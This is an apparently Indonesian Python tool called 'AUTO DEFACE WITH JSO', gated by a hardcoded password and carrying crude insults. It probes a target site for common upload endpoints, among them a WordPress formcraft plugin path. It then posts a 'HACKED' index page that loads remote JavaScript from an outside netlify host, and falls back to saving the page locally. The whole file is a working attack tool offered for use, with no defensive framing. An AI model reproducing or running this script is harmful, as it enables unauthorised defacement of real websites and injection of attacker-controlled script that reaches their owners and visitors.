#!/usr/bin/env python3
# AUTO DEFACE WITH JSO - PASSWORD PROTECTED
import requests
import sys

PASSWORD = "Mr.RpaezXploit"  # Ganti dengan password kuat
OWNER_ID = "rpaez"

def check_access():
    user = input("[?] Username: ").strip()
    if user == OWNER_ID:
        print("\n🔥 Welcome Boss - GHOST AI Active 🔥")
        print("   Akses penuh diberikan!\n")
        return True
    else:
        password = input("[?] Password: ").strip()
        if password == PASSWORD:
            print("\n[+] Akses diberikan.\n")
            return True
        else:
            print("\n❌ Password nya salah kocak,kontak admin dulu sana kontol")
            print("   Contact owner buat akses.\n")
            sys.exit()

def main():
    # Banner berdasarkan user
    if len(sys.argv) > 1 and sys.argv[1] == OWNER_ID:
        print("""
    ╔══════════════════════════════════════╗
    ║     🏴‍☠️  AUTO DEFACE - OWNER MODE     ║
    ║        GHOSTT AI - ACTIVE            ║
    ╚══════════════════════════════════════╝
        """)
    else:
        print("""
    ╔══════════════════════════════════╗
    ║       AUTO DEFACE TOOL           ║
    ║   (Limited Access - User Mode)   ║
    ╚══════════════════════════════════╝
        """)
    
    target = input("[?] Target URL: ").strip()
    if not target.startswith("http"):
        target = "http://" + target
    
    jso_url = input("[?] JSO Script URL (default: https://jso-matrixman.netlify.app/dov16bo.js): ").strip()
    if not jso_url:
        jso_url = "https://jso-matrixman.netlify.app/dov16bo.js"
    
    html_payload = f"""<!DOCTYPE html>
<html>
<head>
<title>HACKED</title>
<style>
body {{ margin:0; background:#000; color:#0f0; font-family:monospace; text-align:center; padding-top:100px; }}
h1 {{ color:#f00; font-size:3em; text-shadow:0 0 20px #f00; }}
</style>
<script type="text/javascript" src="{jso_url}"></script>
</head>
<body>
<h1>DEFACED</h1>
<p>JSO Payload Active</p>
</body>
</html>"""
    
    upload_paths = [
        "/admin/upload.php", "/uploads/upload.php", "/filemanager/upload.php",
        "/inc/upload.php", "/upload.php", "/wp-content/plugins/formcraft/lib/upload.php",
        "/assets/upload.php", "/admin/do_upload.php", "/panel/upload.php"
    ]
    
    for path in upload_paths:
        url = target.rstrip('/') + path
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                files = {'file': ('index.html', html_payload, 'text/html')}
                resp = requests.post(url, files=files, timeout=15)
                if resp.status_code == 200:
                    print(f"\n✅ Deface sukses: {target}/index.html")
                    return
        except:
            continue
    
    print("\n⚠️  Gagal auto upload. Coba manual.")
    with open("deface_jso.html", "w") as f:
        f.write(html_payload)
    print("💾 File disimpan: deface_jso.html")

if __name__ == "__main__":
    check_access()
    main()
